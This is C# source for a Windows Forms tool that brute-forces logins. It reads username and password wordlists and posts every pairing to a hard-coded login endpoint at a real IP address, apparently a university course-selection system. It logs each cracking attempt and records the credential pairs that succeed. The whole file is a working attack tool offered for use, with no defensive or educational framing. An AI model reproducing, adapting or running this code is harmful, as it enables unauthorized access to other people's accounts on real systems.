using JumpKick.HttpLib;
using System;
using System.IO;
using System.Windows.Forms;

namespace QiangZhi
{
    public partial class MainForm : Form
    {
        private int UserNumberInt;
        private int UserPositionNumberInt;
        private int PassNumberInt;
        private int PassPositionNumberInt;
        private int CountNumberInt;
        private int CountPositionNumberInt;

        private String UserFileString;
        private String PassFileString;
        private String LinkString = "http://210.36.80.160/jsxsd/xk/LoginToXk";

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            UserNumberInt = 0;
            UserPositionNumberInt = 0;
            PassNumberInt = 0;
            PassPositionNumberInt = 0;
            CountNumberInt = 0;
            CountPositionNumberInt = 0;

            UserFileString = "";
            PassFileString = "";

            CheckForIllegalCrossThreadCalls = false;

        }

        private void UserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.InitialDirectory = "C:\\";
            dialog.Filter = "*.txt|*.txt";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                UserFileString = dialog.FileName;
                Userlabel.Text = "用户文件：" + dialog.FileName;
                using (StreamReader sr = new StreamReader(dialog.FileName))
                {

                    String LineString;
                    UserNumberInt = 0;
                    UserListBox.Items.Clear();
                    while ((LineString = sr.ReadLine()) != null)
                    {
                        UserNumberInt++;
                        UserListBox.Items.Add(LineString);
                    }
                    Userlabel.Text += " | 共：" + UserNumberInt + " 个用户";
                }
            }
        }

        private void PassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.InitialDirectory = "C:\\";
            dialog.Filter = "*.txt|*.txt";
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                PassFileString = dialog.FileName;
                Passlabel.Text = "密码文件：" + dialog.FileName;
                using (StreamReader sr = new StreamReader(dialog.FileName))
                {
                    String LineString;
                    PassNumberInt = 0;
                    PassListBox.Items.Clear();
                    while ((LineString = sr.ReadLine()) != null)
                    {
                        PassNumberInt++;
                        PassListBox.Items.Add(LineString);
                    }
                    Passlabel.Text += " | 共：" + PassNumberInt + " 个密码";
                }
                if (UserNumberInt != 0 && PassNumberInt != 0)
                {
                    UserPositionNumberInt = 0;
                    PassPositionNumberInt = 0;
                    CountPositionNumberInt = 0;
                    InfoProgressBar.Minimum = 0;
                    CountNumberInt = UserNumberInt * PassNumberInt;
                    InfoProgressBar.Maximum = UserNumberInt * PassNumberInt;
                    Countlabel.Text = "预计次数：约 " + UserNumberInt * PassNumberInt + " 次";
                }
                else
                {
                    Countlabel.Text = "预计次数：无法预测！";
                }
            }
        }

        private void Userlabel_Click(object sender, EventArgs e)
        {
            if (UserNumberInt == 0)
            {
                UserToolStripMenuItem_Click(sender, e);
            }
            else
            {
                if (MessageBox.Show("清除用户文件", "请确认！", MessageBoxButtons.OKCancel) == DialogResult.OK)
                {
                    UserNumberInt = 0;
                    UserFileString = "";
                    Userlabel.Text = "用户文件：未选择！";
                    Countlabel.Text = "预计次数：无法预测！";
                }
            }
        }

        private void Passlabel_Click(object sender, EventArgs e)
        {
            if (PassNumberInt == 0)
            {
                PassToolStripMenuItem_Click(sender, e);
            }
            else
            {
                if (MessageBox.Show("清除密码文件", "请确认！", MessageBoxButtons.OKCancel) == DialogResult.OK)
                {
                    PassNumberInt = 0;
                    PassFileString = "";
                    Passlabel.Text = "密码文件：未选择！";
                    Countlabel.Text = "预计次数：无法预测！";
                }
            }
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            if (UserNumberInt == 0 || PassNumberInt == 0)
            {
                MessageBox.Show("请先选择文件！", "错误！", MessageBoxButtons.OK);
                return;
            }
            start();
        }

        private void start()
        {

            StartButton.Enabled = false;
            InfoProgressBar.Value = CountPositionNumberInt;
            InfoTextBox.AppendText("当前破解次数：" + (CountPositionNumberInt + 1) + "\n");
            InfoTextBox.AppendText("当前破解账号：" + UserListBox.Items[UserPositionNumberInt].ToString() + "\n");
            InfoTextBox.AppendText("当前尝试密码：" + PassListBox.Items[PassPositionNumberInt].ToString() + "\n");

            Http.Post(LinkString)
                .Form(new { USERNAME = UserListBox.Items[UserPositionNumberInt].ToString(), PASSWORD = PassListBox.Items[PassPositionNumberInt].ToString() })
                .OnSuccess(result =>
                {
                    if (result.Contains("<head id"))
                    {
                        InfoTextBox.AppendText("当前破解状态：Success\n");
                        SuccessListBox.Items.Add(UserListBox.Items[UserPositionNumberInt].ToString() + " | " + PassListBox.Items[PassPositionNumberInt].ToString());
                    }
                    else
                    {
                        InfoTextBox.AppendText("当前破解状态：Failure\n");
                    }
                    if (UserPositionNumberInt == (UserNumberInt - 1))
                    {
                        if (PassPositionNumberInt == (PassNumberInt - 1))
                        {
                            InfoProgressBar.Value = CountNumberInt;
                            InfoTextBox.AppendText("破解已完成！");
                            StartButton.Enabled = true;
                            return;
                        }
                    }
                    if (PassPositionNumberInt == (PassNumberInt - 1))
                    {
                        UserPositionNumberInt++;
                        PassPositionNumberInt = 0;
                    }
                    else
                    {
                        PassPositionNumberInt++;
                    }
                    if (CountPositionNumberInt != (CountNumberInt - 1))
                    {
                        CountPositionNumberInt++;
                        start();
                    }
                })
                 .OnFail(result =>
                 {
                     InfoTextBox.AppendText("当前破解状态：Network Failure，Try retry\n");
                     start();
                 })
                .Go();

        }

    }

}
